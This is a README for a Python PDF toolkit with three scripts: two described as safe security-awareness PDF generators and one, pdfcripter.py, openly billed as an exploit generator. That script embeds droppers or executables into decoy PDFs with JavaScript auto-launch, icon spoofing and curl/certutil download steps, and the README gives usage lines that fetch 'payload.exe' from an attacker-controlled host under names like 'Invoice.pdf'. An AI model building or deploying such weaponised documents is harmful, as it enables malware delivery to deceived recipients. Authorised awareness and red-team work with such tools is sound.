

---

# Python PDF Security & Awareness Toolkit

A collection of Python utility scripts designed for security awareness testing, simulated document compilation, and payload generation exercises.

---

## 🛠️ Included Files

| File Name | Description | Key Features |
| --- | --- | --- |
| **`pdfcrypt.py`** | A tactical, hacker-terminal themed Tkinter desktop application that compiles secure, static PDF awareness simulations locally.

 | • Matrix/hacker color palette GUI

<br>

<br>• Strict HTTPS URL validation & payload blocking

<br>

<br>• Recent URL history persistence (JSON)

<br>

<br>• Multiple layouts (Classic, Minimal, Banner)

 |
| **`pdfcripter.py`** | A dual-interface (CLI & Menu-driven) exploit generator (v4.1) designed to embed payloads or droppers into PDF documents.

 | • Custom/decoy PDF import support

<br>

<br>• JavaScript `OpenAction` triggers (new browser tab + auto-launch)

<br>

<br>• Windows PE icon stamper (`--icon` / `.ico`)

<br>

<br>• Automated CMD dropper generation (`curl` / `certutil`)

 |
| **`pdf-cripter.py`** | A beginner-friendly, defensive Tkinter application that generates completely safe security-awareness simulation training documents.

 | • Zero active content guarantee (no JS, macros, or links)

<br>

<br>• Renders target URLs as plain, non-clickable text boxes

<br>

<br>• Built-in defence-in-depth bytecode scanner to verify safety

<br>

<br>• Strict path validation and error handling

 |

---

## 📋 Requirements & Dependencies

Most scripts rely on Python 3.8+ and standard libraries, with specific requirements depending on the tool:

* **`reportlab`** (Required for `pdfcrypt.py` and `pdf-cripter.py` to compile documents)


```bash
pip install reportlab

```


* **Tkinter** (Included with standard Python installations on most systems for GUI apps).
* **Windows OS** (Required specifically if utilizing the Win32 resource API features in `pdfcripter.py` for icon stamping).



---

## 🚀 Usage Guide

### 1. Security-Awareness PDF Generator (`pdfcrypt.py`)

Launches a tactical terminal-styled graphical user interface to generate security awareness training PDFs.

```bash
python3 pdfcrypt.py

```

### 2. Exploit / Payload Generator (`pdfcripter.py`)

Offers an interactive numbered hacker menu or full command-line execution parameters.

* **Launch Interactive Menu:**
```bash
python3 pdfcripter.py --menu

```


* **Command-Line Example (Decoy Mode):**
```bash
python3 pdfcripter.py -u http://<your-ip>/payload.exe -n "Invoice.pdf" --decoy real_invoice.pdf

```


* **Command-Line Example (Direct Embed with Custom Icon):**
```bash
python3 pdfcripter.py -u http://<your-ip>/payload.exe -n "Doc.pdf" --embed-exe --icon myicon.ico --open --debug

```



### 3. Safe Awareness Simulation Generator (`pdf-cripter.py`)

Launches a clean graphical utility focused strictly on safe, non-executable training simulations.

```bash
python3 pdf-cripter.py

```

---

## ⚠️ Disclaimer

These scripts are intended strictly for authorized security testing, educational purposes, and defensive awareness training. Ensure you have explicit permission from system owners before conducting simulated assessments.
